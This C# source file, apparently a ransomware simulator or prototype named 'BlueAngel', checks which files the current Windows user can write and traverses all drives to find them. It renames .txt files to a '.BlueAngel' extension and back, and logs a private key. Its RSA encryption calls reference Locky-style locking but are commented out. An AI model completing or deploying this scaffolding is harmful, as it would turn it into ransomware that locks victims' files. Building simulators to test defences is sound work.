﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Management;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace BlueAngel
{
    // Get current user security status
    public class CurrentUserSecurity
    {
        WindowsIdentity _currentUser;
        WindowsPrincipal _currentPrincipal;

        public CurrentUserSecurity()
        {
            _currentUser = WindowsIdentity.GetCurrent();
            _currentPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
        }

        public bool HasAccess(DirectoryInfo directory, FileSystemRights right)
        {
            // Get the collection of authorization rules that apply to the directory.
            AuthorizationRuleCollection acl = directory.GetAccessControl().GetAccessRules(true, true, typeof(SecurityIdentifier));
            return HasFileOrDirectoryAccess(right, acl);
        }

        public bool HasAccess(FileInfo file, FileSystemRights right)
        {
            try
            {
                file.IsReadOnly = false;
            }
            catch (Exception)
            {
                // Nothing
            }

            try
            {
                // Get the collection of authorization rules that apply to the file.
                AuthorizationRuleCollection acl = file.GetAccessControl().GetAccessRules(true, true, typeof(SecurityIdentifier));
                return (HasFileOrDirectoryAccess(right, acl) && (!file.Attributes.HasFlag(FileAttributes.ReadOnly)));
            }
            catch (Exception)
            {
                return false;
            }
        }

        private bool HasFileOrDirectoryAccess(FileSystemRights right, AuthorizationRuleCollection acl)
        {
            bool allow = false;
            bool inheritedAllow = false;
            bool inheritedDeny = false;

            for (int i = 0; i < acl.Count; i++)
            {
                FileSystemAccessRule currentRule = (FileSystemAccessRule)acl[i];
                // If the current rule applies to the current user.
                if (_currentUser.User.Equals(currentRule.IdentityReference) || _currentPrincipal.IsInRole((SecurityIdentifier)currentRule.IdentityReference))
                {

                    if (currentRule.AccessControlType.Equals(AccessControlType.Deny))
                    {
                        if ((currentRule.FileSystemRights & right) == right)
                        {
                            if (currentRule.IsInherited)
                            {
                                inheritedDeny = true;
                            }
                            else
                            {
                                // Non inherited "deny" takes overall precedence.
                                return false;
                            }
                        }
                    }
                    else if (currentRule.AccessControlType.Equals(AccessControlType.Allow))
                    {
                        if ((currentRule.FileSystemRights & right) == right)
                        {
                            if (currentRule.IsInherited)
                            {
                                inheritedAllow = true;
                            }
                            else
                            {
                                allow = true;
                            }
                        }
                    }
                }
            }

            if (allow)
            {
                // Non inherited "allow" takes precedence over inherited rules.
                return true;
            }
            return inheritedAllow && !inheritedDeny;
        }
    }

    //Adding base file ops
    public class FileSystemOperation
    {
        /// <summary>
        /// File System Interactions
        /// </summary>
        /// 
        public List<string> TargetFilePaths;
        // Sequence of file extensions to scan for
        public string TargetFileExtensions;
        // Number of target files found on the system
        public int TargetFileFound;
        BlueAngel.CurrentUserSecurity CurrentUser;

        public bool HasPermissionOnFile(string path)
        {
            // this could be configured to have different results
            if (this.CurrentUser.HasAccess(new DirectoryInfo(Path.GetDirectoryName(path)), FileSystemRights.Write))
            {
                return this.CurrentUser.HasAccess(new FileInfo(path), FileSystemRights.Modify);
            }
            else
            {
                return false;
            }
        }

        private bool DirectoryToSkip(string path)
        {
            return path.StartsWith("C:\\$", StringComparison.OrdinalIgnoreCase);
        }

        EncryptionOperation FileEncrypter = new EncryptionOperation();

        /// Recursive scan of a directory tree, skip unaccessible files
        /// Base method from: http://stackoverflow.com/a/12332773
        public IEnumerable<string> Traverse(string rootDirectory)
        {
            IEnumerable<string> files = Enumerable.Empty<string>();
            IEnumerable<string> directories = Enumerable.Empty<string>();
            try
            {
                // Test for UnauthorizedAccessException.
                var permission = new FileIOPermission(FileIOPermissionAccess.PathDiscovery, rootDirectory);
                permission.Demand();

                files = Directory.GetFiles(rootDirectory, this.TargetFileExtensions);
                directories = Directory.GetDirectories(rootDirectory);
            }
            catch
            {
                // Ignore folder
                rootDirectory = null;
            }

            foreach (var file in files)
            {
                FileAttributes fa = File.GetAttributes(file);
                if (!fa.HasFlag(FileAttributes.Directory) && HasPermissionOnFile(file) && !DirectoryToSkip(file))
                {
                    yield return file;
                }
            }

            // Recursive call for SelectMany.
            var subdirectoryItems = directories.SelectMany(Traverse);
            foreach (var result in subdirectoryItems)
            {
                FileAttributes fa = File.GetAttributes(result);
                if (!fa.HasFlag(FileAttributes.Directory) && HasPermissionOnFile(result) && !DirectoryToSkip(result))
                {
                    yield return result;
                }
            }
        }

        public void WriteLog(string logMessage)
        {

            string exePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

            try
            {
                using (StreamWriter w = File.AppendText(exePath + "\\" + "BlueAngel.log"))
                {
                    Log(logMessage, w);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("failed to log :/");
            }

        }

        public void LogKeyData(string privatekey, string publickey)
        {

            string currentdatetime = (DateTime.Now.ToString("yyyy-dd-M-HH-mm-ss") + "-KEY.log");
            var keylogfile = File.Create(currentdatetime);

            using (StreamWriter outputFile = new StreamWriter(keylogfile))
            {
                outputFile.WriteLine("Welcome to your BlueAngel Key Backup Log File!");
                outputFile.WriteLine("Private Key: " + privatekey);
                outputFile.WriteLine("Public Key: " + publickey);
            }

        }

        public void Log(string logMessage, TextWriter txtWriter)
        {
            try
            {
                logMessage = (DateTime.Now.ToLongTimeString() + " : " + logMessage);
                txtWriter.WriteLine(logMessage);

            }
            catch (Exception ex)
            {
            }
        }

        public void startstopFileDump()
        {

        }

        public FileInfo[] GetLockyFileCount(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files
            return Files;
        }

        public FileInfo[] GetTXTFileCount(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Txt files
            return Files;
        }

        public void LockTXTFile(FileInfo file)
        {
            string oldfilename = file.Name;
            string newfilename = (file.Name).Replace(".txt", ".BlueAngel");
            string oldfileExtension = file.Extension;
            string newfilefullname = (file.FullName).Replace(".txt", ".BlueAngel");

            try
            {
                System.IO.File.Move(file.Name, newfilename);
                //FileEncrypter.EncryptFileRSA(newfilefullname);
            }
            catch
            {
                //can't touch this
            }
        }

        public void LockTXTFiles(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Txt files

            foreach (FileInfo file in Files)
            {
                //Console.WriteLine(file.Name);
                string oldfilename = file.Name;
                string newfilename = (file.Name).Replace(".txt", ".BlueAngel");
                string oldfileExtension = file.Extension;
                string newfilefullname = (file.FullName).Replace(".txt", ".BlueAngel");

                try
                {
                    System.IO.File.Move(file.Name, newfilename);
                    //FileEncrypter.EncryptFileRSA(newfilefullname);
                }
                catch
                {
                    //can't touch this
                }


            }
        }

        public void UnlockLockyFile(FileInfo file)
        {
            //Console.WriteLine(file.Name);
            string newfilename = (file.Name).Replace(".BlueAngel", ".txt");
            string newfilefullname = (file.FullName).Replace(".BlueAngel", ".txt");
            try
            {
                System.IO.File.Move(file.Name, newfilename);
                //FileEncrypter.DecryptFileRSA(newfilefullname);

            }
            catch
            {
                //can't touch this
            }
        }

        public void UnlockLockyFiles(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files

            foreach (FileInfo file in Files)
            {
                //Console.WriteLine(file.Name);
                string newfilename = (file.Name).Replace(".BlueAngel", ".txt");
                string newfilefullname = (file.FullName).Replace(".BlueAngel", ".txt");
                try
                {
                    System.IO.File.Move(file.Name, newfilename);
                    //FileEncrypter.DecryptFileRSA(newfilefullname);

                }
                catch
                {
                    //can't touch this
                }

            }
        }

        private void Inspect(List<DriveInfo> drives)
        {
            long data = 0;
            long counter = 0;

            foreach (DriveInfo drive in drives)
            {
                string currentRoot = drive.RootDirectory.FullName;

                foreach (string _filepath in Traverse(currentRoot))
                {
                    // Skip files related to this program
                    if (_filepath.StartsWith(Path.GetFullPath(Environment.CurrentDirectory)))
                    {
                        continue;
                    };

                    if (HasPermissionOnFile(_filepath))
                    {
                        data += new FileInfo(_filepath).Length;
                        counter++;
                    }
                }
            }

        }

    }
}